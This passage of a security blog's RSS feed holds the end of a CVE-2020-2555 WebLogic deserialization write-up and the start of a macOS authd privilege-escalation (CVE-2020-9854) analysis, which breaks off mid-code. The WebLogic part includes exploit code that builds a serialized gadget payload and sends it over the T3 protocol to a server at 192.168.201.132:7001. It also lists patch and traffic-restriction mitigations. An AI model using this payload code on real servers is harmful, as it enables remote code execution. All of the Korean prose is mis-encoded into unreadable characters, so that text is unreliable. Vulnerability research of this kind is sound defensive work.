        &lt;span class=&quot;c1&quot;&gt;// T3 send, you can also use python script. weblogic_t3.py&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;T3ProtocolOperation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;192.168.201.132&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;7001&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// test&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;badAttributeValueExpException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//        deserialize();&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test.ser&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test.ser&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ê²°ê³¼&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dm0703.png&quot; alt=&quot;/assets/dm0703.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ëŒ€ì‘ë°©ì•ˆ&quot;&gt;ëŒ€ì‘ë°©ì•ˆ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ìµœì‹ ë²„ì „ìœ¼ë¡œ ì—…ë°ì´íŠ¸&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://www.oracle.com/security-alerts/cpujan2020.html&quot;&gt;Oracle Critical Patch Update Advisory - January 2020&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Oracle WebLogic Server T3 / T3S í”„ë¡œí† ì½œ íŠ¸ë˜í”½ ì œí•œ (ì„ì‹œë°©ì•ˆ)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://y4er.com/post/weblogic-cve-2020-2555/&quot;&gt;https://y4er.com/post/weblogic-cve-2020-2555/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sec.vnpt.vn/2020/03/the-art-of-deserialization-gadget-hunting-part-3/&quot;&gt;https://sec.vnpt.vn/2020/03/the-art-of-deserialization-gadget-hunting-part-3/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server&quot;&gt;https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://alvinalexander.com/java/jwarehouse/openjdk-8/jdk/src/share/classes/javax/management/BadAttributeValueExpException.java.shtml&quot;&gt;https://alvinalexander.com/java/jwarehouse/openjdk-8/jdk/src/share/classes/javax/management/BadAttributeValueExpException.java.shtml&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Y4er/CVE-2020-2555&quot;&gt;https://github.com/Y4er/CVE-2020-2555&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Oracle-WebLogic-Deserialization-CVE-2020-2555</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Oracle-WebLogic-Deserialization-CVE-2020-2555</guid>
        
        <category>CVE</category>
        
        
      </item>
    
      <item>
        <title>MacOS LPE CVE-2020-9854</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê°•ì¸ìš±&lt;/p&gt;

&lt;h1 id=&quot;macos-lpe-cve-2020-9854&quot;&gt;MacOS LPE CVE-2020-9854&lt;/h1&gt;

&lt;p&gt;MacOS 10.15.5 ì´í•˜ ì—ì„œ root ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë‚˜ì™”ë‹¤. ì´ ì·¨ì•½ì ì— ëŒ€í•´ ì•Œì•„ë³´ì&lt;/p&gt;

&lt;h3 id=&quot;ì·¨ì•½ì 1&quot;&gt;ì·¨ì•½ì 1&lt;/h3&gt;

&lt;p&gt;ì²« ë²ˆì§¸ ì·¨ì•½ì ì€ authd(Security.framework)ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ë‹¤. ì´ í”„ë ˆì„ì›Œí¬ëŠ” í‚¤ ì²´ì¸ ì—‘ì„¸ìŠ¤, ì½”ë“œ ì„œëª… ë° ê¶Œí•œ ë¶€ì—¬ë¥¼ í¬í•¨í•œ ë³´ì•ˆ ê´€ë ¨ ìƒí•­ì„ ê´€ë¦¬í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì‚¬ì „ ë“±ë¡ëœ ê¶Œí•œê³¼ ì§€ì›í•˜ëŠ” ruleì€ ì•„ë˜ì˜ URLì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://opensource.apple.com/source/Security/Security-59306.11.20/OSX/authd/authorization.plist.auto.html&quot;&gt;https://opensource.apple.com/source/Security/Security-59306.11.20/OSX/authd/authorization.plist.auto.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ruleì„ ì‚¬ìš©í•˜ë©´ rule ìê²©ì„ ê°–ê¸° ìœ„í•´ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ í•„ìš”í•œ ê¶Œí•œì„ ë§¤ìš° ìƒì„¸í•˜ê²Œ ì œì–´í•  ìˆ˜ ìˆë‹¤. ì¼ë¶€ ê¶Œí•œì€ ì•„ë˜ì™€ ê°™ì´ íŒì—… ëŒ€í™”ìƒìì— ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/authd_popup.png&quot; alt=&quot;/assets/authd_popup.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;authd ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ process.c ì—ì„œ ì¬ë¯¸ìˆëŠ” ë¶€ë¶„ì´ ìˆë‹¤ê³  í•œë‹¤. í´ë¼ì´ì–¸íŠ¸ë¡œë¶€í„° ì½”ë“œ ì„œëª… ê´€ë ¨ ì •ë³´ë¥¼ ê°€ì ¸ì˜¤ëŠ” ì½”ë“œ ë¼ì¸ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SecCodeCopySigningInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;codeRef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kSecCSRequirementInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;require_noerr_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os_log_debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AUTHD_LOG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;process: PID %d SecCodeCopySigningInformation failed with %d&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auditInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFDictionaryGetValueIfPresent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kSecCodeInfoEntitlementsDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFGetTypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFDictionaryGetTypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code_entitlements&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFDictionaryCreateCopy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kCFAllocatorDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì½”ë“œì—ì„œ ë³´ë“¯ì´ í´ë¼ì´ì–¸íŠ¸ë¡œ ë¶€í„° ë°ì´í„°ë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ SecCodeCopySigningInformation ë¥¼ í˜¸ì¶œí•˜ê³  ìê²©ì„ ì°¾ìœ¼ë©´ í•´ë‹¹ ê°’ì„ dictë¡œ ë³µì‚¬í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì ì—¬ê¸°ì„œ ë¬¸ì œëŠ” Apple ê°œë°œì ë¬¸ì„œë¥¼ ë³´ë©´SecCodeCopySigningInformationì˜ ë¬¸ì œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤ê³  í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signing&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;corrupt&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invalid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;may&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fail&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;it&lt;/span&gt; 
 &lt;span class=&quot;nx&quot;&gt;may&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partial&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;To&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ensure&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;valid&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returned&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;errors&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;are&lt;/span&gt; 
 &lt;span class=&quot;nx&quot;&gt;raised&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;invalid&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;must&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;successfully&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SecCodeCheckValidity&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt; 
 &lt;span class=&quot;nx&quot;&gt;SecCodeCheckValidityWithErrors&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;before&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;calling&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SecCodeCopySigningInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;SecCodeCheckValidityì˜ ê¸°ëŠ¥ì€ ë””ìŠ¤í¬ì˜ í´ë¼ì–¸íŠ¸ ë°”ì´ë„ˆë¦¬ë¥¼ CDHashì™€ ë¹„êµí•˜ì—¬ ë¬´ê²°ì„±ì„ í™•ì¸í•œë‹¤. í•˜ì§€ë§Œ ì´ëŸ° ì¼ì´ ì ˆëŒ€ ë°œìƒí•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— â€œauthdâ€ì˜ ì œì¬ë¥¼ ë°›ì§€ ì•Šê³  ì„ì˜ì˜ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ì œ â€œauthdâ€ê°€ ì–´ë–¤ ê¶Œí•œì— ê´€ì‹¬ì´ ìˆëŠ”ì§€ ì•Œì•„ ë‚´ì•¼í•œë‹¤. ì´ê²ƒì€ â€œauthdâ€ ë‚´ë¶€ì ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ê°€ í•„ìš”í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì‚¬ìš© í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;process_has_entitlement_for_right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;entitled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;CFTypeRef&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code_entitlements&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFDictionaryGetValueIfPresent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code_entitlements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;com.apple.private.AuthorizationServices&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CFGetTypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFArrayGetTypeID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;CFStringRef&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CFStringCreateWithCStringNoCopy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kCFAllocatorDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kCFStringEncodingUTF8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kCFAllocatorNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
